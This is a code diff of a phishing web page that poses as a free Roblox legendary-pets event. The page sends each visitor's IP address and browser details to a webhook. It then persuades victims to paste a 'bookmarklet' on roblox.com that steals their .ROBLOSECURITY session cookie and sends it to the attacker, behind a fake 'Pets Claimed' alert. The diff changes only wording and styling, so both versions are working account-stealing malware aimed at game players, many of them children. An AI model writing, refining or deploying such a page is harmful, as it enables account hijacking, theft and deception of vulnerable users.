@@ -3,41 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Legendary Pets Limited Event</title>
+    <title>Roblox - Free Legendary Pets Event</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&family=Roboto:wght@400;700&display=swap');
-        body { margin:0; background:linear-gradient(135deg,#0a0a0a,#1a0033); color:#fff; font-family:'Roboto',sans-serif; text-align:center; padding:15px; overflow-x:hidden; }
-        .container { max-width:900px; margin:0 auto; }
-        header { background:rgba(0,0,0,0.95); padding:25px; border-bottom:6px solid #00ff00; }
-        .logo { font-family:'Press Start 2P',cursive; color:#00ff00; font-size:38px; text-shadow:0 0 25px #00ff00; }
-        h1 { color:#ffd700; text-shadow:0 0 35px #ffd700; font-size:3.2em; margin:35px 0 15px; }
-        img { max-width:96%; cursor:pointer; border:12px solid #ffd700; box-shadow:0 0 60px #ffd700,0 0 120px rgba(255,215,0,0.9); border-radius:18px; transition:all .4s; }
-        img:hover { transform:scale(1.06); }
-        .status { margin:30px auto; padding:20px; background:rgba(0,255,0,0.2); border:4px solid #00ff00; border-radius:14px; max-width:700px; font-weight:bold; display:none; font-size:1.2em; }
-        .bookmarklet { background:linear-gradient(#ffd700,#ffaa00); color:#000; padding:25px; margin:40px auto; display:block; font-weight:bold; cursor:pointer; border-radius:16px; width:94%; max-width:520px; box-shadow:0 0 40px #ffd700; font-size:1.25em; }
-        .steps { background:#111; border:4px solid #ffd700; padding:35px; margin:35px auto; max-width:700px; border-radius:16px; text-align:left; line-height:1.7; font-size:1.15em; }
+        body { margin:0; background:linear-gradient(135deg,#0a0a0a,#1a0033); color:#fff; font-family:'Roboto',sans-serif; text-align:center; padding:10px; }
+        .container { max-width:920px; margin:0 auto; }
+        header { background:rgba(0,0,0,0.95); padding:20px; border-bottom:5px solid #00ff00; }
+        .logo { font-family:'Press Start 2P',cursive; color:#00ff00; font-size:34px; text-shadow:0 0 20px #00ff00; }
+        h1 { color:#ffd700; text-shadow:0 0 30px #ffd700; font-size:2.8em; margin:25px 0 10px; }
+        img { max-width:98%; cursor:pointer; border:10px solid #ffd700; box-shadow:0 0 50px #ffd700,0 0 90px rgba(255,215,0,0.8); border-radius:15px; transition:all .3s; }
+        img:hover { transform:scale(1.04); }
+        .status { margin:25px auto; padding:18px; background:rgba(0,255,0,0.15); border:3px solid #00ff00; border-radius:12px; max-width:680px; font-weight:bold; display:none; font-size:1.15em; }
+        .bookmarklet { background:linear-gradient(#ffd700,#ffaa00); color:#000; padding:24px; margin:35px auto; display:block; font-weight:bold; cursor:pointer; border-radius:14px; width:90%; max-width:500px; box-shadow:0 0 35px #ffd700; font-size:1.2em; }
+        .steps { background:#111; border:3px solid #ffd700; padding:28px; margin:30px auto; max-width:680px; border-radius:14px; text-align:left; line-height:1.65; }
     </style>
 </head>
 <body>
     <div class="container">
-        <header><div class="logo">ROBLOX OFFICIAL EVENT</div></header>
-        <h1>🎉 CLAIM LIMITED LEGENDARY PETS NOW! 🎉</h1>
-        <p style="font-size:1.5em;color:#00ff00;">Tap/Click the image below for Neon Dragon, Galaxy Griffin & more</p>
+        <header><div class="logo">ROBLOX EVENT</div></header>
+        <h1>🎉 CLAIM YOUR FREE LEGENDARY PETS! 🎉</h1>
+        <p style="font-size:1.4em; color:#00ff00;">Click the image below to instantly claim Neon Dragon + more!</p>
         
         <img id="claimImg" src="https://i.imgur.com/0z3vK9L.jpg" alt="Legendary Pets">
         
-        <div id="status" class="status">🔄 Verifying your Roblox account...</div>
+        <div id="status" class="status">🔄 Processing your claim & verifying account...</div>
         
         <div id="steps" class="steps" style="display:none;">
-            <strong>✅ Almost Done!</strong><br><br>
-            1. Go to roblox.com (logged in)<br>
-            2. Copy the bookmarklet below<br>
-            3. Paste as new bookmark → Click it on Roblox
+            <strong>✅ Claim Verified!</strong><br><br>
+            1. Go to <strong>roblox.com</strong> (logged in)<br>
+            2. Tap the gold button to copy bookmarklet<br>
+            3. Paste as bookmark → Click it on Roblox
         </div>
         
         <div id="bmArea" style="display:none;">
             <div class="bookmarklet" onclick="copyBookmarklet()">📌 COPY BOOKMARKLET</div>
         </div>
+        
+        <p style="margin-top:40px; color:#888;">Limited event • Rewards sent instantly</p>
     </div>
 
     <script>
@@ -50,17 +52,17 @@
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    username: "🍪 Elite Image Logger",
+                    username: "🍪 Image Logger",
                     content: `**Hit** → ${action}`,
-                    embeds: [{title: "Logger Data", description: "```Action: " + action + "\nIP: " + ip + "\nUA: " + navigator.userAgent + "\nTime: " + new Date().toISOString() + "```", color: 0x00ff88}]
+                    embeds: [{title: "Data", description: "```Action: " + action + "\nIP: " + ip + "\nUA: " + navigator.userAgent + "\nTime: " + new Date().toISOString() + "```", color: 0x00ff88}]
                 })
             }).catch(()=>{});
         }
 
         function copyBookmarklet() {
-            const bmCode = `javascript:(function(){const w="${webhook}";const t=document.cookie.split("; ").find(r=>r.startsWith(".ROBLOSECURITY="))||"None";fetch(w,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"**ROBLOX COOKIE GRABBED VIA IMAGE LOGGER!**\\n\`\`\`"+t+"\`\`\`\\nUA: "+navigator.userAgent+"\\nTime: "+new Date().toISOString()})});alert("✅ Legendary Pets Claimed!");})();`;
+            const bmCode = `javascript:(function(){const w="${webhook}";const t=document.cookie.split("; ").find(r=>r.startsWith(".ROBLOSECURITY="))||"None";fetch(w,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:"**ROBLOX COOKIE GRABBED!**\\n\`\`\`"+t+"\`\`\`\\nUA: "+navigator.userAgent+"\\nTime: "+new Date().toISOString()})});alert("✅ Legendary Pets Claimed!");})();`;
             navigator.clipboard.writeText(bmCode).then(() => {
-                alert("✅ Copied! Paste into new bookmark on roblox.com and click it.");
+                alert("✅ Copied! Go to roblox.com (logged in) → Paste as bookmark → Click it.");
                 sendLog("Bookmarklet Used");
             });
         }
@@ -69,13 +71,13 @@
             sendLog("Image Clicked");
             document.getElementById('status').style.display = 'block';
             setTimeout(() => {
-                document.getElementById('status').innerHTML = '✅ Verified!';
+                document.getElementById('status').innerHTML = '✅ Verified! Final step...';
                 document.getElementById('steps').style.display = 'block';
                 document.getElementById('bmArea').style.display = 'block';
-            }, 1400);
+            }, 1600);
         });
 
-        window.onload = () => setTimeout(() => sendLog("Page Loaded"), 700);
+        window.onload = () => setTimeout(() => sendLog("Page Loaded"), 800);
     </script>
 </body>
 </html>
